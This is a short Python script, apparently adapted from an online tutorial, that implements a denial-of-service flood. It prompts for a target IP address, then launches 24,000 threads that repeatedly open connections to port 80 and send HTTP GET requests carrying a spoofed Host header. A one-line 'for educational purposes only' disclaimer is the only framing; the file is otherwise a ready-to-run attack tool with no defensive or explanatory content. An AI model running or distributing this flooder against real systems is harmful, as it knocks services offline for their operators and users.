#!/usr/bin/env python3
#Created by PepeBigotes, credits to https://www.neuralnine.com/code-a-ddos-script-in-python/
#For educational purposes only

import socket
import os
import threading

os.system('cls' if os.name == 'nt' else 'clear')
print("""\
┌┐┌┌─┐┌┬┐  ┌─┐┬  ┌─┐┬ ┬
│││├┤  │───└─┐│  │ ││││
┘└┘└─┘ ┴   └─┘┴─┘└─┘└┴┘
""")

print("Select a target IP (default is 192.168.0.1):")
target = str(input(" > "))
if not target: target = "192.168.0.1"
port = int(80)
fake_ip = '44.197.175.168'
 
        
attack_num = 0

def attack():
    try:
        while True:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
            s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))

            global attack_num
            attack_num += 1
            print(attack_num)
            s.close()
    except KeyboardInterrupt:
        pass
            
for i in range(24000):
    thread = threading.Thread(target=attack)
    thread.start()